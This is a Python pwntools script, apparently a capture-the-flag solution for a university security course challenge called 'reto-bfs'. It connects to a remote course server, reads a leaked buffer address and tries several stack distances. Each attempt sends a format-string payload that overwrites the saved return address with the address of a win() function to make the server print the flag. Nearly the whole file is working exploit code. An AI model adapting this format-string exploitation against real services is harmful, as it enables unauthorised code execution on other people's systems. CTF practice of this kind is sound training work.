from pwn import *
import time
import os

# Configuración
# Obtener la ruta del binario relativa al script
script_dir = os.path.dirname(os.path.abspath(__file__))
binary_path = os.path.join(script_dir, 'reto-bfs')
context.binary = binary = ELF(binary_path, checksec=False)
host = 'ic.catedras.linti.unlp.edu.ar'
port = 15019

# El offset ya lo confirmamos: es 4
OFFSET_CORRECTO = 4
WIN_ADDR = binary.symbols['win']

# Posibles distancias estándar en 32-bits (Buffer + Padding + EBP)
# 64+4=68, 64+8+4=76, etc.
distancias_a_probar = [68, 72, 76, 80, 84, 88, 92]

print(f"[*] Iniciando ataque. Objetivo win: {hex(WIN_ADDR)}")
print(f"[*] Offset confirmado: {OFFSET_CORRECTO}")

for distancia in distancias_a_probar:
    print(f"\n[+] --- Probando distancia: {distancia} bytes ---")
    try:
        # Conectamos de nuevo para cada intento (el proceso muere tras cada intento)
        p = remote(host, port, level='error') 

        # 1. Leer el leak del buffer
        p.recvuntil(b'buffer comienza en: ')
        buffer_leak_str = p.recvline().strip()
        buffer_leak = int(buffer_leak_str, 16)
        
        # 2. Calcular objetivo basado en la distancia actual
        target_ret_addr = buffer_leak + distancia

        # 3. Crear Payload
        # write_size='short' es vital para que quepa en el buffer
        payload = fmtstr_payload(OFFSET_CORRECTO, {target_ret_addr: WIN_ADDR}, write_size='short')

        if len(payload) > 64:
            print(f"   [!] Payload muy largo ({len(payload)}), saltando esta distancia.")
            p.close()
            continue

        # 4. Enviar
        p.sendlineafter(b'Ingrese su input:', payload)

        # 5. Buscar la flag en la respuesta
        # Leemos todo (puede tardar un poco por los espacios vacíos)
        print("   [*] Enviado. Escuchando...")
        response = p.recvall(timeout=2).decode(errors='ignore')

        if "IC{" in response:
            print("\n" + "!"*50)
            print(f"¡ÉXITO CONFIRMADO CON DISTANCIA {distancia}!")
            print("!"*50)
            
            # Imprimir solo la bandera limpia
            for line in response.split('\n'):
                if "IC{" in line:
                    print(f"\nFLAG: {line.strip()}\n")
            
            p.close()
            break # Terminamos el loop
        else:
            print("   [-] Falló. La ejecución no saltó a win().")

        p.close()

    except Exception as e:
        print(f"   [Error] {e}")
        try: p.close()
        except: pass

print("[*] Proceso finalizado.")